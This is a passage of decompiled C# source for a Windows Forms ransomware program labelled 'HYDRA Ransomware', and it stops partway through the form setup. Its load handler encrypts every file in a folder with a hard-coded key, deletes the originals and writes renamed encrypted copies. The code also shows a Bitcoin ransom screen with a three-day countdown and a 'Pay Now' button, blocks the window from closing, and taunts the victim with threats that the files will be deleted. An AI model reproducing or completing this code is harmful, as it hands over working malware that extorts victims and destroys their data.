using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using fuck_rats_antivirus.My;
using fuck_rats_antivirus.My.Resources;

namespace fuck_rats_antivirus;

[DesignerGenerated]
public class Form1 : Form
{
	private bool keyPressAltF4;

	private DateTime targetdt;

	private TimeSpan countdownfrom;

	private IContainer components;

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Label1_Click;
			Label label = _Label1;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label1 = value;
			label = _Label1;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = PictureBox1_Click;
			PictureBox pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				((Control)pictureBox).remove_Click(eventHandler);
			}
			_PictureBox1 = value;
			pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				((Control)pictureBox).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual WebBrowser WebBrowser1
	{
		[CompilerGenerated]
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			WebBrowserDocumentCompletedEventHandler val = new WebBrowserDocumentCompletedEventHandler(WebBrowser1_DocumentCompleted);
			WebBrowser webBrowser = _WebBrowser1;
			if (webBrowser != null)
			{
				webBrowser.remove_DocumentCompleted(val);
			}
			_WebBrowser1 = value;
			webBrowser = _WebBrowser1;
			if (webBrowser != null)
			{
				webBrowser.add_DocumentCompleted(val);
			}
		}
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button2_Click;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox3")]
	internal virtual TextBox TextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer2
	{
		[CompilerGenerated]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			Timer timer = _Timer2;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			timer = _Timer2;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button3_Click;
			Button button = _Button3;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_KeyUp(new KeyEventHandler(Form1_KeyUp));
		((Form)this).add_Closing((CancelEventHandler)Form1_Closing);
		((Control)this).add_KeyDown(new KeyEventHandler(Form1_KeyDown));
		keyPressAltF4 = false;
		countdownfrom = TimeSpan.FromDays(3.0);
		InitializeComponent();
	}

	private void Label1_Click(object sender, EventArgs e)
	{
	}

	private void PictureBox1_Click(object sender, EventArgs e)
	{
		Interaction.Shell("print file /D:\\\\printer", (AppWinStyle)2, false, -1);
	}

	private void PictureBox2_Click(object sender, EventArgs e)
	{
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (keyPressAltF4)
		{
			keyPressAltF4 = false;
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Label2.set_Text(Conversions.ToString(Conversions.ToDouble(Label2.get_Text()) + 1.0));
		if (Conversions.ToDouble(Label2.get_Text()) == 7.0)
		{
			PictureBox1.set_Image((Image)(object)Resources.H_alternate_3);
			Timer1.set_Enabled(false);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string[] files = Directory.GetFiles("E:\\test");
		foreach (string text in files)
		{
			string text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(text);
			TextBox1.set_Text(text2);
			string text3 = TextBox1.get_Text();
			string key = "777";
			string text4 = new Class1(key).EncryptData(text3);
			TextBox3.set_Text(text4);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
			string text5 = text + ".5H311 1NJ3C706";
			StreamWriter streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter(text5, true);
			streamWriter.WriteLine(TextBox3.get_Text());
			streamWriter.Close();
		}
		((Control)Label2).set_Visible(false);
		((Form)this).set_KeyPreview(true);
		Timer2.set_Enabled(true);
		targetdt = DateTime.Now.Add(countdownfrom);
	}

	private void WebBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		try
		{
			TextBox1.set_Text(WebBrowser1.get_Document().GetElementById("btc2usd").get_InnerText());
			if (TextBox1.get_Text().Contains("BTC / USD"))
			{
				Label4.set_Text(TextBox1.get_Text().Replace("BTC / USD", ""));
				TextBox3.set_Text(Conversions.ToString(100.0 / Conversions.ToDouble(Label4.get_Text())));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Label4.set_Text("Error: " + ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Unknown result type (might be due to invalid IL or missing references)
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_0325: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TextBox2.get_Text(), "", false) == 0)
		{
			if (Operators.CompareString(Label7.get_Text(), "0", false) == 0)
			{
				((Computer)MyProject.Computer).get_Audio().Play((Stream)Resources.tfr, (AudioPlayMode)1);
				MessageBox.Show("Nice try He He He. You have 5 more attempts left", "Password Attempt Failed", (MessageBoxButtons)0, (MessageBoxIcon)16);
				Label7.set_Text(Conversions.ToString(Conversions.ToDouble(Label7.get_Text()) + 1.0));
				((ButtonBase)Button2).set_Text("Decrypt (" + Label7.get_Text() + ")");
			}
			else if (Operators.CompareString(Label7.get_Text(), "1", false) == 0)
			{
				((Computer)MyProject.Computer).get_Audio().Play((Stream)Resources.tfr, (AudioPlayMode)1);
				MessageBox.Show("Nice try He He He. You have 4 more attempts left", "Password Attempt Failed", (MessageBoxButtons)0, (MessageBoxIcon)16);
				Label7.set_Text(Conversions.ToString(Conversions.ToDouble(Label7.get_Text()) + 1.0));
				((ButtonBase)Button2).set_Text("Decrypt (" + Label7.get_Text() + ")");
			}
			else if (Operators.CompareString(Label7.get_Text(), "2", false) == 0)
			{
				((Computer)MyProject.Computer).get_Audio().Play((Stream)Resources.tfr, (AudioPlayMode)1);
				MessageBox.Show("Nice try He He He. You have 3 more attempts left", "Password Attempt Failed", (MessageBoxButtons)0, (MessageBoxIcon)16);
				Label7.set_Text(Conversions.ToString(Conversions.ToDouble(Label7.get_Text()) + 1.0));
				((ButtonBase)Button2).set_Text("Decrypt (" + Label7.get_Text() + ")");
			}
			else if (Operators.CompareString(Label7.get_Text(), "3", false) == 0)
			{
				((Computer)MyProject.Computer).get_Audio().Play((Stream)Resources.tfr, (AudioPlayMode)1);
				MessageBox.Show("Nice try He He He. You have 2 more attempts left", "Password Attempt Failed", (MessageBoxButtons)0, (MessageBoxIcon)16);
				Label7.set_Text(Conversions.ToString(Conversions.ToDouble(Label7.get_Text()) + 1.0));
				((ButtonBase)Button2).set_Text("Decrypt (" + Label7.get_Text() + ")");
			}
			else if (Operators.CompareString(Label7.get_Text(), "4", false) == 0)
			{
				((Computer)MyProject.Computer).get_Audio().Play((Stream)Resources.tfr, (AudioPlayMode)1);
				MessageBox.Show("Nice try He He He. You have 1 more attempts left", "Password Attempt Failed", (MessageBoxButtons)0, (MessageBoxIcon)16);
				Label7.set_Text(Conversions.ToString(Conversions.ToDouble(Label7.get_Text()) + 1.0));
				((ButtonBase)Button2).set_Text("Decrypt (" + Label7.get_Text() + ")");
			}
			else if (Operators.CompareString(Label7.get_Text(), "5", false) == 0)
			{
				((Computer)MyProject.Computer).get_Audio().Play((Stream)Resources.tfr, (AudioPlayMode)1);
				MessageBox.Show("Nice try He He He. You have 0 more attempts left. This is the final attempt after this your files is permanently deleting.", "Password Attempt Failed", (MessageBoxButtons)0, (MessageBoxIcon)16);
				Label7.set_Text(Conversions.ToString(Conversions.ToDouble(Label7.get_Text()) + 1.0));
				((ButtonBase)Button2).set_Text("Decrypt (" + Label7.get_Text() + ")");
			}
			else
			{
				string text = "start /min notepad /P \\tprint.txt";
				Interaction.Shell("cmd.exe /c " + text, (AppWinStyle)0, false, -1);
			}
		}
	}

	private void Form1_KeyUp(object sender, KeyEventArgs e)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Invalid comparison between Unknown and I4
		keyPressAltF4 = false;
		if (e.get_Alt() && (int)e.get_KeyCode() == 115)
		{
			e.set_Handled(true);
			e = null;
			keyPressAltF4 = true;
		}
	}

	private void Form1_Closing(object sender, CancelEventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		if (keyPressAltF4)
		{
			keyPressAltF4 = false;
			e.Cancel = true;
			MessageBox.Show("", "");
		}
		e.Cancel = true;
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.Form2).Show();
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		TimeSpan timeSpan = targetdt.Subtract(DateTime.Now);
		if (timeSpan.TotalMilliseconds > 0.0)
		{
			Label9.set_Text(timeSpan.ToString("dd\\:hh\\:mm\\:ss"));
			return;
		}
		Label9.set_Text("00:00:00");
		Timer2.Stop();
	}

	private void Form1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_KeyData() == 262259)
		{
			((Computer)MyProject.Computer).get_Audio().Play((Stream)Resources.tfr, (AudioPlayMode)1);
			MessageBox.Show("Lol You Can't close me", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			e.set_Handled(true);
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_02aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b4: Expected O, but got Unknown
		//IL_0341: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Expected O, but got Unknown
		//IL_0434: Unknown result type (might be due to invalid IL or missing references)
		//IL_043e: Expected O, but got Unknown
		//IL_04ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d8: Expected O, but got Unknown
		//IL_0568: Unknown result type (might be due to invalid IL or missing references)
		//IL_0572: Expected O, but got Unknown
		//IL_05f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0602: Expected O, but got Unknown
		//IL_07f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0800: Expected O, but got Unknown
		//IL_0a8a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a94: Expected O, but got Unknown
		//IL_0b31: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b3b: Expected O, but got Unknown
		//IL_0bd9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be3: Expected O, but got Unknown
		//IL_0c8b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c95: Expected O, but got Unknown
		//IL_0d3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d45: Expected O, but got Unknown
		//IL_0dc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd2: Expected O, but got Unknown
		//IL_0e62: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e6c: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Panel1 = new Panel();
		Label9 = new Label();
		Label7 = new Label();
		TextBox1 = new TextBox();
		Label4 = new Label();
		Label3 = new Label();
		Label2 = new Label();
		Label1 = new Label();
		PictureBox1 = new PictureBox();
		WebBrowser1 = new WebBrowser();
		Panel2 = new Panel();
		Button1 = new Button();
		Panel3 = new Panel();
		Panel4 = new Panel();
		Button3 = new Button();
		Label8 = new Label();
		TextBox3 = new TextBox();
		Button2 = new Button();
		TextBox2 = new TextBox();
		Label6 = new Label();
		Label5 = new Label();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		((Control)Panel1).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)Panel2).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((Control)Panel4).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)Panel1).set_BackColor(Color.Black);
		((Control)Panel1).get_Controls().Add((Control)(object)Label9);
		((Control)Panel1).get_Controls().Add((Control)(object)Label7);
		((Control)Panel1).get_Controls().Add((Control)(object)TextBox1);
		((Control)Panel1).get_Controls().Add((Control)(object)Label4);
		((Control)Panel1).get_Controls().Add((Control)(object)Label3);
		((Control)Panel1).get_Controls().Add((Control)(object)Label2);
		((Control)Panel1).get_Controls().Add((Control)(object)Label1);
		((Control)Panel1).get_Controls().Add((Control)(object)PictureBox1);
		((Control)Panel1).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)Panel1).set_Dock((DockStyle)3);
		((Control)Panel1).set_Location(new Point(0, 0));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(311, 546));
		((Control)Panel1).set_TabIndex(0);
		Label9.set_AutoSize(true);
		((Control)Label9).set_Font(new Font("Impact", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label9).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)Label9).set_Location(new Point(59, 493));
		((Control)Label9).set_Name("Label9");
		((Control)Label9).set_Size(new Size(24, 26));
		((Control)Label9).set_TabIndex(5);
		Label9.set_Text("0");
		Label7.set_AutoSize(true);
		((Control)Label7).set_Font(new Font("Impact", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)Label7).set_Location(new Point(148, 439));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(24, 26));
		((Control)Label7).set_TabIndex(4);
		Label7.set_Text("0");
		((Control)TextBox1).set_Location(new Point(144, 279));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(145, 20));
		((Control)TextBox1).set_TabIndex(1);
		((Control)TextBox1).set_Visible(false);
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Impact", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)Label4).set_Location(new Point(139, 342));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(24, 26));
		((Control)Label4).set_TabIndex(3);
		Label4.set_Text("0");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Impact", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)Label3).set_Location(new Point(59, 302));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(213, 26));
		((Control)Label3).set_TabIndex(2);
		Label3.set_Text("Current Bitcoin Price");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Impact", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(59, 553));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(24, 26));
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("0");
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Impact", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)Label1).set_Location(new Point(59, 9));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(204, 26));
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("HYDRA  Ransomware");
		PictureBox1.set_Image((Image)(object)Resources.d9zp1s9_d7d0a4e4_240a_413d_a6f6_460c2451a278);
		((Control)PictureBox1).set_Location(new Point(3, 38));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(308, 224));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		((Control)WebBrowser1).set_Location(new Point(12, 279));
		((Control)WebBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser1.set_ScriptErrorsSuppressed(true);
		((Control)WebBrowser1).set_Size(new Size(20, 20));
		((Control)WebBrowser1).set_TabIndex(0);
		WebBrowser1.set_Url(new Uri("https://cryptobrowser.site/widget/3/", UriKind.Absolute));
		((Control)WebBrowser1).set_Visible(false);
		((Control)Panel2).set_BackColor(Color.Black);
		((Control)Panel2).get_Controls().Add((Control)(object)Button1);
		((Control)Panel2).set_Dock((DockStyle)1);
		((Control)Panel2).set_Location(new Point(311, 0));
		((Control)Panel2).set_Name("Panel2");
		((Control)Panel2).set_Size(new Size(1082, 35));
		((Control)Panel2).set_TabIndex(1);
		((Control)Button1).set_BackgroundImage((Image)componentResourceManager.GetObject("Button1.BackgroundImage"));
		((Control)Button1).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Button1).set_Cursor(Cursors.get_Hand());
		((Control)Button1).set_Dock((DockStyle)4);
		((ButtonBase)Button1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button1).get_FlatAppearance().set_MouseDownBackColor(Color.Transparent);
		((ButtonBase)Button1).get_FlatAppearance().set_MouseOverBackColor(Color.Transparent);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_Location(new Point(1031, 0));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(51, 35));
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((Control)Panel3).set_BackColor(Color.FromArgb(25, 25, 25));
		((Control)Panel3).get_Controls().Add((Control)(object)Panel4);
		((Control)Panel3).set_Dock((DockStyle)5);
		((Control)Panel3).set_Location(new Point(311, 35));
		((Control)Panel3).set_Name("Panel3");
		((Control)Panel3).set_Size(new Size(1082, 511));
		((Control)Panel3).set_TabIndex(2);
		((Control)Panel4).set_BackColor(Color.FromArgb(25, 25, 25));
		((Control)Panel4).get_Controls().Add((Control)(object)Button3);
		((Control)Panel4).get_Controls().Add((Control)(object)Label8);
		((Control)Panel4).get_Controls().Add((Control)(object)TextBox3);
		((Control)Panel4).get_Controls().Add((Control)(object)Button2);
		((Control)Panel4).get_Controls().Add((Control)(object)TextBox2);
		((Control)Panel4).get_Controls().Add((Control)(object)Label6);
		((Control)Panel4).get_Controls().Add((Control)(object)Label5);
		((Control)Panel4).set_Dock((DockStyle)5);
		((Control)Panel4).set_Location(new Point(0, 0));
		((Control)Panel4).set_Name("Panel4");
		((Control)Panel4).set_Size(new Size(1082, 511));
		((Control)Panel4).set_TabIndex(3);
		((ButtonBase)Button3).set_BackColor(Color.Gold);
		((ButtonBase)Button3).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button3).set_FlatStyle((FlatStyle)0);
		((Control)Button3).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button3).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)Button3).set_Location(new Point(880, 168));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(108, 43));
		((Control)Button3).set_TabIndex(9);
		((ButtonBase)Button3).set_Text("Pay Now");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(false);
		Label8.set_AutoSize(true);
		((Control)Label8).set_Font(new Font("Impact", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label8).set_ForeColor(Color.FromArgb(255, 128, 0));
		((Control)Label8).set_Location(new Point(598, 185));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(49, 26));
		((Control)Label8).set_TabIndex(5);
		Label8.set_Text("BTC");
		((TextBoxBase)TextBox3).set_BackColor(Color.FromArgb(25, 25, 25));
		((Control)TextBox3).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox3).set_ForeColor(Color.FromArgb(255, 128, 0));
		((Control)TextBox3).set_Location(new Point(653, 189));
		((Control)TextBox3).set_Name("TextBox3");
		((Control)TextBox3).set_Size(new Size(171, 22));
		((Control)TextBox3).set_TabIndex(8);
		((ButtonBase)Button2).set_BackColor(Color.Gold);
		((ButtonBase)Button2).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)0);
		((Control)Button2).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button2).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)Button2).set_Location(new Point(908, 453));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(108, 43));
		((Control)Button2).set_TabIndex(7);
		((ButtonBase)Button2).set_Text("Decrypt");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((TextBoxBase)TextBox2).set_BackColor(Color.FromArgb(25, 25, 25));
		((Control)TextBox2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox2).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)TextBox2).set_Location(new Point(373, 466));
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(463, 22));
		((Control)TextBox2).set_TabIndex(5);
		Label6.set_AutoSize(true);
		((Control)Label6).set_Font(new Font("Impact", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)Label6).set_Location(new Point(17, 460));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(350, 26));
		((Control)Label6).set_TabIndex(6);
		Label6.set_Text("Enter Passord To Decrypt Your Files");
		Label5.set_AutoSize(true);
		((Control)Label5).set_Font(new Font("Impact", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)Label5).set_Location(new Point(6, 10));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(1021, 435));
		((Control)Label5).set_TabIndex(4);
		Label5.set_Text(componentResourceManager.GetString("Label5.Text"));
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1000);
		Timer2.set_Interval(1000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.White);
